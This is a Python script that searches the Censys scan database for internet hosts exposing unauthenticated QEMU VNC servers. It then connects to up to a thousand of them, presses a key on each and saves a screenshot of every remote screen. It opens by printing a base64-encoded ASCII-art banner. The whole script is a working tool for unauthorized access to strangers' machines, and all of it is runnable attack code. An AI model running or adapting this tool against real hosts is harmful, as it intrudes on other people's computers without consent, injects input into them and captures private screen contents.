import base64
import censys.ipv4
from time import sleep

from vncdotool import api

banner = """ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLmVkIiIiIiAiIiIkJCQkYmUuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLSIgICAgICAgICAgIF4iIioqJCQkZS4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiIgICAgICAgICAgICAgICAgICAgJyQkJGMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICAgICAgICAgICAgICAgICAgICAgICI0JCRiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkICAzICAgICAgICAgICAgICAgICAgICAgJCQkJAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCAgKiAgICAgICAgICAgICAgICAgICAuJCQkJCQkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4kICBeYyAgICAgICAgICAgJCQkJCRlJCQkJCQkJCQuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQkTCAgNC4gICAgICAgICA0JCQkJCQkJCQkJCQkJCRiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCRiIF5jZWVlZWUuICA0JFJlamVjdDNkKiQkJCQkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGUkIiI9LiAgICAgICQkJCRQIGQkJCQkRiAkICQkJCQkJCQkJC0gJCQkJCQkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeiQkYi4gXmMgICAgIDMkJCRGICIkJCQkYiAgICQiJCQkJCQkJCAgJCQkJCoiICAgICAgLj0iIiRjCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0JCQkJEwgICBcICAgICAkJFAiICAiJCRiICAgLiQgJCQkJCQuLi5lJCQgICAgICAgIC49ICBlJCQkLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXiokJCQkJGMgICUuLiAgICpjICAgIC4uICAgICQkIDMkJCQkJCQkJCQkZUYgICAgIHpQICBkJCQkJCQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIioqJCQkZWMgICAiXCAgICVjZSIiICAgICQkJCAgJCQkJCQkJCQkJCogICAgLnIiID0kJCQkUCIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIqJGIuICAiYyAgKiRlLiAgICAqKiogZCQkJCQkIkwkJCAgICAuZCIgIGUkJCoqKiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBeKiQkYyBeJGMgJCQkICAgICAgNEokJCQkJCUgJCQkIC5lKiIuZWVQIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkJCQkJCQiJyQ9ZS4uLi4kKiQkKiokY3okJCIgIi4uZCQqIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiokJCQgICo9JTQuJCBMIEwkIFAzJCQkRiAkJCRQIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiQgICAiJSplYkpMemIkZSQkJCQkYiAkUCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJS4uICAgICAgNCQkJCQkJCQkJCQgIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCQkZSAgIHokJCQkJCQkJCQkJQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIqJGMgICIkJCQkJCQkUCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiIiIiokJCQkJCQkJGJjCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4tIiAgICAuJCoqKiQkJCIiIiplLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuLSIgICAgLmUkIiAgICAgIiokYyAgXipiLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC49KiIiIiIgICAgLmUkKiIgICAgICAgICAgIipiYyAgIiokZS4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4kIiAgICAgICAgLnoqIiAgICAgICAgICAgICAgIF4qJGUuICAgIioqKioqZS4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCRlZSRjICAgLmQiICAgICAgICAgICAgICAgICAgICAgIiokLiAgICAgICAgMy4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXiokRSIpJC4uJCIgICAgICAgICAgICAgICAgICAgICAgICAgKiAgIC5lZT09ZCUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJC5kJCQkKiAgICAgICAgICAgICAgICAgICAgICAgICAgICogIEokJCRlKgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiIiIiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIkJCQiCiAgICAgICAgICAgICAgICAgICAgIC4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcyAgICAgICAgICAgICAgICAgICAgIF8gICAgICAgICAgICAgICAgICAgICAgICAgIC54Kz06LiAgICAgIAogICAgICAgICAgICAgICAgICAgIEA4OD4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOjggICAgICAgICAgICAgICAgICAgIHUgICAgICAgICAgICAgICAgICAgICAgICAgIHpgICAgIF4lICAgICAKICAgICAuZGBgICAgICAgICAgICAlOFAgICAgICAudSAgICAuICAgICAgICAgICAgICAgICAgLjg4ICAgICAgICAgICAgICAgICAgIDg4TnUuICAgdS4gICAuZGBgICAgICAgICAgICAgICAuICAgPGsgICAgCiAgICAgQDhOZS4gICAudSAgICAgIC4gICAgIC5kODhCIDpAOGMgICAgICAgIHUgICAgICAgOjg4OG9vbyAgICAgIC51ICAgICAgICc4ODg4OC5vODg4YyAgQDhOZS4gICAudSAgICAgIC5AOE5lZDgiICAgIAogICAgICU4ODg4OnVAODhOICAgLkA4OHUgID0iODg4OGY4ODg4ciAgICB1czg4OHUuICAtKjg4ODg4ODggICB1ZDg4ODguICAgICAgXjg4ODggIDg4ODggICU4ODg4OnVAODhOICAgLkBeJTg4ODgiICAgICAKICAgICAgYDg4OEkgIDg4OC4gJyc4ODhFYCAgIDQ4ODg+Jzg4IiAgLkA4OCAiODg4OCIgICA4ODg4ICAgIDo4ODgnODg4OC4gICAgICA4ODg4ICA4ODg4ICAgYDg4OEkgIDg4OC4geDg4OiAgYCk4Yi4gICAgCiAgICAgICA4ODhJICA4ODhJICAgODg4RSAgICA0ODg4PiAnICAgIDk4ODggIDk4ODggICAgODg4OCAgICBkODg4ICc4OCUiICAgICAgODg4OCAgODg4OCAgICA4ODhJICA4ODhJIDg4ODhOPSo4ODg4ICAgIAogICAgICAgODg4SSAgODg4SSAgIDg4OEUgICAgNDg4OD4gICAgICA5ODg4ICA5ODg4ICAgIDg4ODggICAgODg4OC4rIiAgICAgICAgIDg4ODggIDg4ODggICAgODg4SSAgODg4SSAgJTgiICAgIFI4OCAgICAKICAgICB1Vzg4OEwgIDg4OCcgICA4ODhFICAgLmQ4ODhMIC4rICAgOTg4OCAgOTg4OCAgIC44ODg4THU9IDg4ODhMICAgICAgICAgIC44ODg4Yi44ODhQICB1Vzg4OEwgIDg4OCcgICBAOFdvdSA5JSAgICAgCiAgICAnKjg4ODg4TnU4OFAgICAgODg4JiAgIF4iODg4OCoiICAgIDk4ODggIDk4ODggICBeJTg4OCogICAnODg4OGMuIC4rICAgICAgXlk4ODg4KiIiICAnKjg4ODg4TnU4OFAgIC44ODg4ODhQYCAgICAgIAogICAgfiAnODg4ODhGYCAgICAgIFI4ODgiICAgICAiWSIgICAgICAiODg4KiIiODg4IiAgICAnWSIgICAgICI4ODg4OCUgICAgICAgICAgYFkiICAgICAgfiAnODg4ODhGYCAgICBgICAgXiJGICAgICAgICAKICAgICAgIDg4OCBeICAgICAgICAgIiIgICAgICAgICAgICAgICAgIF5ZIiAgIF5ZJyAgICAgICAgICAgICAgICJZUCcgICAgICAgICAgICAgICAgICAgICAgIDg4OCBeICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAqOEUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqOEUgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgJzg+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJzg+ICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiICAgIAoK"""

print(base64.b64decode(banner.encode('ascii')).decode('ascii'))
c = censys.ipv4.CensysIPv4()

target_list = []

fields = [
    "ip",
    "ports",
    "location.country",
]

vnc_banner_desktop_name = "qemu"
query_string = f"5900.vnc.banner.desktop_name: {vnc_banner_desktop_name} OR 5901.vnc.banner.desktop_name: {vnc_banner_desktop_name}"

print(f"Query: {query_string}")

for page in c.search(
    query_string, 
    fields,
    max_records = 1000,
):
    for port in page.get('ports'):
        if int(port) in range(5900,5910):
            ip_addr = page.get('ip')
            vnchost = ip_addr+'::'+str(port)
            target_list.append(vnchost)

print(f"[!] attempting to screenshot {len(target_list)} targets")
for target in target_list:
    try:
        client = api.connect(target)
        print("Connecting to host")
        client.timeout = 45
        client.keyPress('space')
        sleep(1)
        print(f"Grabbing screenshot of: {target}")
        client.captureScreen(target+'.png')
        print("disconnecting...")
        client.disconnect()

        del client

    except TimeoutError:
        print("ERROR :: Timed Out\nskipping...")
        print("disconnecting...")
        sleep(3)
        client.disconnect()
        
        del client
        continue

    except KeyboardInterrupt:
        print("skipping...")
        print("disconnecting...")
        print(client)
        sleep(1)
        client.disconnect()
        client = None
        
        del client
        continue

    except Exception:
        print("Error skipping..")
        print("disconnecting...")
        sleep(1)
        client.disconnect()
        client = None
        
        del client
        continue

